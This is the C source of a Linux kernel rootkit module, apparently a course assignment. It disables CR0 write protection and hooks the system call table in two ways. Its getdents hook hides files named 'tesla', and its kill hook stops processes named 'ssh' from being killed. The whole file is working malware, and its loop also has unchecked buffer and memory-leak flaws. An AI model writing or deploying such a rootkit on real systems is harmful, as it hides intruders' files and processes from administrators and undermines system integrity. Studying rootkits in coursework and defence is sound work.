/*
 * tesla.c -- a kernel module which hides specific files.
 */
#include <linux/module.h> /* for every kernel module */
#include <linux/kernel.h> /* printk() */
#include <linux/version.h> /* printk() */
#include <linux/syscalls.h> /* for kallsyms_lookup_name, and NR_read, NR_write,... */
#include <linux/init.h>  /*  for module_init and module_cleanup */
#include <linux/slab.h>  /*  for kmalloc/kfree */
#include <linux/fs.h>     /* everything... */
#include <linux/errno.h>  /* error codes */
#include <linux/types.h>  /* size_t */
#include "tesla.h"

MODULE_AUTHOR("Shuai Yang"); /* change this line to your name */
MODULE_LICENSE("GPL v2");

/* asmlinkage tells gcc that function parameters will not be in registers, but rather they will be in the stack. */
/* we intercept getdents so as to hide specific files. */
asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
{
	
	/*must declare varialbe ahead of code according to ISO C90*/
	struct linux_dirent *curr, *next; 	
    int pos = 0;
	
	/*asmlinkage long (*orig_getdents)(unsigned int, struct linux_dirent __user *, unsigned int)*/
	/*dirp is the user space buffer pointer*/
	int total_size =  orig_getdents(fd, dirp, count); 	
	//printk("SY: my total_size is %d\n", total_size);

	/*Allocate memory -  void* kmalloc(size_t size, gfp_t flags)*/
    struct linux_dirent *dirp_kernel = kmalloc(total_size, GFP_KERNEL);
	//printk("SY: the address of my dirp_kernel is 0x%p\n", dirp_kernel);
	
	/*copy a buffer from user space to kernel space*/
    /*unsigned long copy_from_user(void * to, const void __user * from, unsigned long n)*/
    if (copy_from_user(dirp_kernel, dirp, total_size) != 0){
        return -EFAULT;
    }
	//printk("SY: the first copied file name is %s\n", dirp_kernel->d_name);

	/*merging*/
	/*set curr pointer points the starting address of the copied kenel space table*/
	curr = dirp_kernel;

	//int pos = (char*)valid_curr->d_reclen;
	//printk("SY: My valid current pointer before loop  is at 0x%p\n",valid_curr);
	//printk("SY: My height(pos) before loop is %d\n", pos);
	while(pos < total_size){
		//printk("SY: Loop starts. My current position is at 0x%p, it's file name is %s, it's len is %d\n",valid_curr,valid_curr->d_name,valid_curr->d_reclen);
		/* C pointer arithmetic   */
		next =(struct linux_dirent*) ((char*)curr + curr->d_reclen);
		//printk("SY: Loop starts. My next pointer is at 0x%p, it's file name is %s, it's len is %d\n",next,next->d_name,next->d_reclen);
		if(strstr(next->d_name, "tesla") != NULL){
			//update current's recel
			//printk("SY: Found! Current file name is %s\n", valid_curr->d_name);
			curr->d_reclen += next->d_reclen;
			//printk("SY: Found! Current reclen is updated to %d\n", valid_curr->d_reclen);
			continue;
		}
		pos += curr->d_reclen;
		curr = next;
		//printk("SY: Move the current pointer forward. The height now is %d\n", pos);
	}
	
	if(copy_to_user(dirp, dirp_kernel, total_size)!=0){
		return -EFAULT;
	}
	
	kfree(dirp_kernel);	
	
	return total_size;
}

/* we intercept kill so that our process can not be killed */
asmlinkage long tesla_kill(pid_t pid, int sig)
{
	int ret;
	//printk("<1>tesla: kill invoked.\n");
	//
	struct task_struct *target;
	target = pid_task(find_pid_ns(pid, &init_pid_ns), PIDTYPE_PID);
	if(target){
		if(strstr(target->comm, "ssh")){
			return -EACCES;
		}
	}

	ret = orig_kill(pid, sig);
	return ret;
}

int tesla_init(void)
{
	printk("<1> tesla: loaded...\n");

	/* search in kernel symbol table and find the address of sys_call_table */
	sys_call_table = (long **)kallsyms_lookup_name("sys_call_table");
 
	if (sys_call_table == NULL) {
		printk(KERN_ERR "where the heck is the sys_call_table?\n");
		return -1;
	}
 
	printk("<1> tesla: sys call table address is 0x%p.\n", sys_call_table);
	printk("sys_read is at address 0x%p, sys_write is at address 0x%p, sys_getdents is at address 0x%p, sys_kill is at address 0x%p\n",(void *)sys_call_table[__NR_read], (void *)sys_call_table[__NR_write], (void *)sys_call_table[__NR_getdents], (void *)sys_call_table[__NR_kill]);

	/* by default, system call table is write-protected; 
	 * change bit 16 of cr0 to 0 to turn off the protection.
	 * The Intel Software Developer Manual (SDM) says: 
	 * Write Protect (bit 16 of CR0) — When set, inhibits supervisor-level 
	 * procedures from writing into read-only pages; when clear, 
	 * allows supervisor-level procedures to write into read-only pages 
	 * (regardless of the U/S bit setting; see Section 4.1.3 and Section 4.6). 
	 * This flag facilitates implementation of the copy-on-write method 
	 * of creating a new process (forking) used by operating systems 
	 * such as UNIX.*/

	write_cr0(read_cr0() & (~0x10000));

	/* save the original kill system call into orig_kill, and replace the kill system call with tesla_kill */
	orig_kill = (void *)sys_call_table[__NR_kill];
	sys_call_table[__NR_kill] = (long *)tesla_kill;
 
    /* modify the system call table so that my wrapper functions will be called when the user calls the corresponding system call functions */
	orig_getdents = (void *)sys_call_table[__NR_getdents];
	sys_call_table[__NR_getdents] = (long *)tesla_getdents;

	/* set bit 16 of cr0, so as to turn the write protection on */
	
	write_cr0(read_cr0() | 0x10000);

	printk("sys_read is at address 0x%p, sys_write is at address 0x%p, sys_getdents is at address 0x%p, sys_kill is at address 0x%p\n",(void *)sys_call_table[__NR_read], (void *)sys_call_table[__NR_write], (void *)sys_call_table[__NR_getdents], (void *)sys_call_table[__NR_kill]);

	return  0;
}

void tesla_exit(void)
{
	printk("<1> tesla: unloaded...\n");
	/* clear bit 16 of cr0 */
	write_cr0(read_cr0() & (~0x10000));

	/* restore the kill system call to its original version */
	sys_call_table[__NR_kill] = (long *)orig_kill;

	/*modify the system call table so as to restore the original system call functions*/
	sys_call_table[__NR_getdents] = (long *)orig_getdents;

	/* set bit 16 of cr0 */
	write_cr0(read_cr0() | 0x10000);

	printk("sys_read is at address 0x%p, sys_write is at address 0x%p, sys_getdents is at address 0x%p, sys_kill is at address 0x%p\n",(void *)sys_call_table[__NR_read], (void *)sys_call_table[__NR_write], (void *)sys_call_table[__NR_getdents], (void *)sys_call_table[__NR_kill]);

}

module_init(tesla_init);
module_exit(tesla_exit);

/* vim: set ts=4: */
